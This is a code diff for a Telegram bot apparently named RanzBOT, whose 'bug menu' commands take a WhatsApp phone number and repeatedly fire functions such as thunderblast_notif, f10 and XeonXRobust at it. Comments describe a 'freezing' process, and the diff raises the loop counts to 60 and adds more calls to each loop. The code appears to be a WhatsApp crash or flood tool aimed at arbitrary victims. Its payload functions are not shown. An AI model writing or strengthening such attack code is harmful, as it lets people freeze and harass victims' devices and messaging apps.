@@ -612,12 +612,18 @@ bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 60; i++) {
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
     await thunderblast_notif(target);
     await thunderblast_notif(target);
-    await thunderblast_notif(target);
-    await thunderblast_notif(target);
-    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -676,10 +682,28 @@ bot.command("xcblank1", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 15; i++) {
+  for (let i = 0; i < 60; i++) {
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
     await XeonXRobust(target, { ptcp: true });
     await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
     await XeonXRobust(target, { ptcp: true });
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await XeonXRobust(target, { ptcp: true });
+    await XeonXRobust(target, { ptcp: true });
+    await thunderblast_notif(target);
     await XeonXRobust(target, { ptcp: true });
   }
 
@@ -1029,14 +1053,7 @@ Selamat ${greeting}!
 ├━━━「 🎯𝘽 𝙐 𝙂 𝙈 𝙀 𝙉 𝙐 」━━━⬣
 │ ᝄ ⌜ 𝘽 𝙐 𝙂 𝙈 𝙀 𝙉 𝙐 ⌟
 │変-> /xcbeta [62xxx]
-│変-> /xiosinvis [62xxx]
-│変-> /xcandro [62xxx]
-│変-> /xciospay [62xxx]
-│変-> /xcsystemui [62xxx]
 │変-> /xcblank1 [62xxx]
-│変-> /xcblank2 [62xxx]
-│変-> /eliminated [62xxx]
-│変-> /executedwa [62xxx]
 ⟣──────────
 > © RanzBOT.1
   `;
